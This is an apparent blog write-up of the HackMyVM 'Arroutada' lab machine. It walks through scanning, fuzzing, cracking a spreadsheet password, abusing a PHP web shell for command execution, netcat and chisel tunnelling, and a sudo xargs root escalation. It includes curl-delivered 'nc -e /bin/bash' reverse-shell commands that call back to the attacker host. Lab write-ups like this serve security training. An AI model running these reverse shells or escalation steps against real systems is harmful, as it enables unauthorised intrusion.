---
layout: post
title: "HackMyVM - Arroutada"
date: 2023-01-21 22:05:00 +0100
categories: hmv
tag: ["PortForward", "RCE"]
---
# HackMyVM > Arroutada

Creator: [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1)
Level: Easy
Release Date: 2023-01-18

## NMAP Scanning

```bash
$ nmap -sC -sV -oA nmap/Arroutada -p- 192.168.1.34
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 22:05 WET
Nmap scan report for 192.168.1.34
Host is up (0.00030s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

## Exiftool

```bash
$ exiftool apreton.png                   
ExifTool Version Number         : 12.54
File Name                       : apreton.png
Directory                       : .
File Size                       : 71 kB
File Modification Date/Time     : 2023:01:08 14:43:02+00:00
File Access Date/Time           : 2023:01:21 22:07:24+00:00
File Inode Change Date/Time     : 2023:01:21 22:07:24+00:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1280
Image Height                    : 661
Bit Depth                       : 8
Color Type                      : Grayscale with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Title                           : {"path": "/scout"}
Image Size                      : 1280x661
Megapixels                      : 0.846
```

```html
$ curl http://192.168.1.34/scout/                         

<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->
```

## Directory Fuzzing

```bash
$ gobuster fuzz -u http://192.168.1.34/scout/FUZZ/docs/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -b 404
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.34/scout/FUZZ/docs/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/21 22:10:54 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=189766] http://192.168.1.34/scout/j2/docs/

===============================================================
2023/01/21 22:11:02 Finished
===============================================================
```

```bash
$ curl http://192.168.1.34/scout/j2/docs/pass.txt
user:password

$ wget http://192.168.1.34/scout/j2/docs/shellfile.ods
--2023-01-26 22:47:09--  http://192.168.1.34/scout/j2/docs/shellfile.ods
Connecting to 192.168.1.34:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11821 (12K) [application/vnd.oasis.opendocument.spreadsheet]
Saving to: ‘shellfile.ods’

shellfile.ods                             100%[===================================================================================>]  11.54K  --.-KB/s    in 0s      

2023-01-26 22:47:09 (117 MB/s) - ‘shellfile.ods’ saved [11821/11821]

$ curl http://192.168.1.34/scout/j2/docs/z206

Ignore z*, please
Jabatito
```

## Crack Spreadsheet File

```bash
$ /usr/share/john/libreoffice2john.py shellfile.ods > hash

$ cat hash 
shellfile.ods:$odf$*1*1*100000*32*b6faccf504c29e07398b10e3145afe6bebc7748bfdbc47986f32136f51661a7b*16*23e0328760785d4860d792544a5d898c*16*c6a419ad516f22a5c0f91ea1cbf584ed*0*622bdd7aa97ec525a89a952afe1f654c1fd8d9f0d86950dba3cc0f10c76ec62774a76d54d4b69a4e0f2cfa64eba0e30b04479327bb9aedf16e0570632a4bba5893e7313a8940a94d315a6a4ead6946b96a82a6eb8b3a6f9bf84a9c5fedd8a7a8f907ba1a92f05571583269bc02931604da7bffd35c5b403bf56a0a96197035b61cd93337649dec1120b9d28f66dcf1247d17a423eaed223e9eed7d7c38e094e2a5997ea1e6c22c82c9c84bdc9006b6c2b73ad8cced6eb47ac45850c333bba8f6bc7344422a85a6787d3ade2501a2f80789c68408f6b484635c6d458af36caab2c00316fc2ae6b0e3bb09138e73e03c5493ea483e9029348f8c4a47bd25cbcc252c62e68ebd308f2285dbca0e28b6738506edeae5a2731e066f8419b49302f9c816730a6d514e64728977655bb8764fdf9d7fc5752cc1b7968cc8cb2aba779646156a2b7923ded336db7aea16c3d3eb1fde9170480cd3d864be85bd14aa46aad08f34916e67f5add14614386f9ae34cc7ebe09ac8820afb42b09d16c026f5fcde4b75e8128b4dd6558d655356d4d5adbcd7b4e0b0753dd54cb1b7104b04638ccb8dd7b13790503af56228970e8693db959c3ab2b516fd1122b471137a4da8942fe346e557dd6f978d2cfaca1ff472bf585a3b46ee7539f895e15780b948464339702cf2ccf15f4c3f45eb705031a636eb64fad0064b11e03eff21dca2bb344e1480266a456e992f4c023a95e66de6dab2a680f2855ff0dade5bfdcbeb13c458ff64c2fe9fe6f03e7296f52a0bfb4d16555f75b2e761e9bc73e56387b94655ebbd76fe860bccde2cbb0672ceb69d4d532ee6eaf94f7a1f82c93bec1117c4c1f93fdf3d06dd152c2773db43c6ceae4a3703d03c81e00160929d6663a12ca911cb4ead204a71dc0e83a4c3a06dfd579e30a7a84d2c06d66c9d903534398a700f82fbdf319e9684774b7e00a4d7dbdedd97d1a1fe6e535e0366d0c5d4920acb95fa9af70c04d1a271f80fd2d5c60e3d52b6423a3637ad9665aab829ad04ee2066ba006889e6e6e62628efa6c266c14cf614ff9bb8b7dce9c07bb710b18b638b0e2033530048bf2745b8624f529b2a5bccda4a530326594ccffe3c457ae657a9b1f7fab0e8295817b4aecc63e29b92daf824c50b968da5eaeea02cdaa6c74a3a7891d8c24a5f66ee7623c7889f9335bb3bc3e4f2b39c9cc21ed78eede60e8af713174489aca596702bccc87552d176d033ee0cb34620730f380c8cbbf54c6f0061de7b8c71752e2d999fc79b8dcffc612b62d3d2b921684ef6d7f043a82b3413f081a454b93f3ee18ad15c0da2d3bd92fd1311d9e550e9e95ac4181451664bb3179cc38969d24cff5de21ec636e2559f0d4807937a255fdb1c1c534717fbf375c407788efc1d133e9d66a29553fd5c9fd489b2ad3e1b838cf41ec18a8a9bd0b01483e8:::::shellfile.ods

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 128/128 AVX 4x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j***11           (shellfile.ods)     
1g 0:00:03:19 DONE (2023-01-26 22:55) 0.005007g/s 82.76p/s 82.76c/s 82.76C/s lachina..iloveyou18
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed. 
```

* PATH : /thejabasshell.php

## FUZZING PHP Parameters

```
$ sudo ffuf -r -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.1.34/thejabasshell.php?FUZZ=ls' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.34/thejabasshell.php?FUZZ=ls
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 3ms]

```

```bash
$ curl http://192.168.1.34/thejabasshell.php?a                                                              
Error: Problem with parameter "b"                                                                                                                                                                      
```

### METHOD 1 (WFUZZ)

```bash
$ wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.34/thejabasshell.php?a=id&b=FUZZ" --hh=33

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.34/thejabasshell.php?a=id&b=FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000006168:   200        1 L      3 W        54 Ch       "pass"                                                                                               

Total time: 0
Processed Requests: 7778
Filtered Requests: 7777
Requests/sec.: 0
```

### METHOD 2 (FUFF)

```bash
$ sudo ffuf -r -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.1.34/thejabasshell.php?a=id&b=FUZZ' -fs 33

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.34/thejabasshell.php?a=id&b=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 33
________________________________________________

pass                    [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 58ms]

```

### RCE

```bash
$ curl "http://192.168.1.34/thejabasshell.php?a=id&b=pass"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

```bash
$ curl "http://192.168.1.34/thejabasshell.php?b=pass&a=nc%20-e%20/bin/bash%20192.168.1.6%204444"
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.34] 37818
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
SHELL=/bin/bash script -q /dev/null
www-data@arroutada:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444

www-data@arroutada:/var/www/html$ 
```

## Priviledge Escalation

### Crontab

```bash
www-data@arroutada:/var/www/html/scout$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * drito /home/drito/service
```

### Local Service Port 8000

```bash
www-data@arroutada:/var/www/html/scout$ ss -nltp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096       127.0.0.1:8000      0.0.0.0:*          
LISTEN 0      511                *:80              *:*    
```

### METHOD 1 : Netcat Port Forward (8000>8001)

```bash
$ nc -nlktp 8001 -c "nc 127.0.0.1 8000"

$ curl 192.168.1.34:8001
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

### METHOD 2 : Chisel #chisel

```bash
$ ./chisel server -p 9000 --reverse
2023/01/27 00:24:56 server: Reverse tunnelling enabled
2023/01/27 00:24:56 server: Fingerprint P+eoVwjgDJwk7zKA4uCqVffMQhsmewqZwN8O14FVMqc=
2023/01/27 00:24:56 server: Listening on http://0.0.0.0:9000
2023/01/27 00:25:04 server: session#1: tun: proxy#R:8000=>8000: Listening
                                                                        
www-data@arroutada:/tmp$ wget http://192.168.1.6:9000/chisel
--2023-01-26 19:21:22--  http://192.168.1.6:9000/chisel
Connecting to 192.168.1.6:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: 'chisel'

chisel              100%[===================>]   7.70M  --.-KB/s    in 0.06s   

2023-01-26 19:21:23 (120 MB/s) - 'chisel' saved [8077312/8077312]

www-data@arroutada:/tmp$ chmod +x chisel

www-data@arroutada:/tmp$ ./chisel client 192.168.1.6:9000 R:8000:127.0.0.1:8000
2023/01/26 19:25:02 client: Connecting to ws://192.168.1.6:9000                                                                                                        
2023/01/26 19:25:02 client: Connected (Latency 889.449µs) 
```

## RCE JSON 

```bash
$ curl 192.168.1.34:8001/priv.php     
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

### Reverse Shell (5555)

* Send Command Request

```bash
$ curl -XPOST http://192.168.1.34:8001/priv.php -H "Content-Type: application/json" -d '{"command":"nc -e /bin/bash 192.168.1.6 5555"}'
```

* Listen 5555

```bash
$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.34] 38514
id
uid=1001(drito) gid=1001(drito) groups=1001(drito)

```

## ROOT

```bash
$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

### [GTFObins XARGS](https://gtfobins.github.io/gtfobins/xargs/)

```bash
sudo xargs -a /dev/null bash
id
uid=0(root) gid=0(root) groups=0(root)
```
